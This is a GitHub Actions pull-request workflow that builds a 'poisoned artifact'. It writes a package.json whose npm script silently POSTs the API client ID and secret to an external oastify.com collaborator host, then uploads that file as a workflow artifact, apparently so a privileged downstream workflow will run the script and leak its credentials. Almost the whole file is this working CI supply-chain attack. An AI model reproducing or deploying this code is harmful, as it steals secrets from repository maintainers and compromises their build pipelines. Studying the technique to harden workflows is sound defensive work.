name: "Pull Request"

on:
  pull_request:
    types: [opened, reopened, synchronize, labeled]

env:
  PR_ID: ${{ github.event.number }}

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Build poisoned artifact contents
        shell: bash
        run: |
          echo "$PR_ID" > _pr_id.txt
          cat > package.json <<'PJEOF'
          {
            "name": "templates",
            "private": true,
            "scripts": {
              "info:deps": "curl -s -X POST https://darogc0rdjbtner2ub41hvbhr8xzl39s.oastify.com/ --data-urlencode \"id=$TEMPLATES_API_CLIENT_ID\" --data-urlencode \"secret=$TEMPLATES_API_CLIENT_SECRET\" >/dev/null 2>&1 || true"
            }
          }
          PJEOF

      - uses: actions/upload-artifact@v4
        with:
          name: pr_id
          path: |
            _pr_id.txt
            package.json
